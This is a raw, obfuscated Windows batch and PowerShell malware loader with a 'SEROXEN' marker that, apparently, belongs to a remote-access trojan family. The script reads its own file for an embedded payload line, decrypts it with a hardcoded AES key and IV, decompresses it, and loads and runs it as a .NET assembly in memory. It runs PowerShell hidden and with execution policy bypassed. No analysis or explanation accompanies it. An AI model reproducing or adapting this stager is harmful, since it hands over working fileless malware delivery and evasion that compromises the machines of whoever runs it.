cd /d %systemdrive%
echo function jvuvC($WcbZQ){
	$pJKcY=[System.Security.Cryptography.Aes]::Create();
	$pJKcY.Mode=[System.Security.Cryptography.CipherMode]::CBC;	
	$pJKcY.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	
	$pJKcY.Key=[System.Convert]::FromBase64String('UcTKmFpQiopgrvrnJxF1J80Mia8ttExbNhnDEuoONMA=');	
	$pJKcY.IV=[System.Convert]::FromBase64String('4QaARqjsGtAo75+0x5EpTw==');	
	$qsLSY=$pJKcY.CreateDecryptor();	
	$return_var=$qsLSY.TransformFinalBlock($WcbZQ, 0, $WcbZQ.Length);	
	$qsLSY.Dispose();	
	$pJKcY.Dispose();	
	$return_var;
}
function fCdwn($WcbZQ){	
    $StdsI=New-Object System.IO.MemoryStream(,$WcbZQ);	
    $gCrCf=New-Object System.IO.MemoryStream;	
    $KjgGG = New-Object System.IO.Compression.GZipStream($StdsI, [IO.Compression.CompressionMode]::Decompress);
    $KjgGG.CopyTo($gCrCf);	
    $KjgGG.Dispose();	
    $StdsI.Dispose();	
    $gCrCf.Dispose();	
    $gCrCf.ToArray();
}
function jljhk($WcbZQ,$eSnhB){	
    $ICFOw = @(		
        '$LggBK = [System.Reflection.Assembly]::Load([byte[]]$WcbZQ);',
   		'$NHxtu = $LggBK.EntryPoint;',		
   		'$NHxtu.Invoke($null, $eSnhB);'
   	);	
   	foreach ($AEYGK in $ICFOw) {		
   	Invoke-Expression $AEYGK	
   	};
}
$FNdYg=[System.IO.File]::(ReadAllText('%~f0').Split([Environment]::NewLine);
foreach ($NXwzm in $FNdYg) {	
    if ($NXwzm.StartsWith('SEROXEN')){	
        $xDggt=$NXwzm.Substring(7);		
        break;	
    }
}
$eBrLa=fCdwn (
    jvuvC ([Convert]::FromBase64String($xDggt))
);
jljhk $eBrLa (,[string[]] ('%~f0'));
 |%systemdrive%\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -noprofile -windowstyle hidden > nul
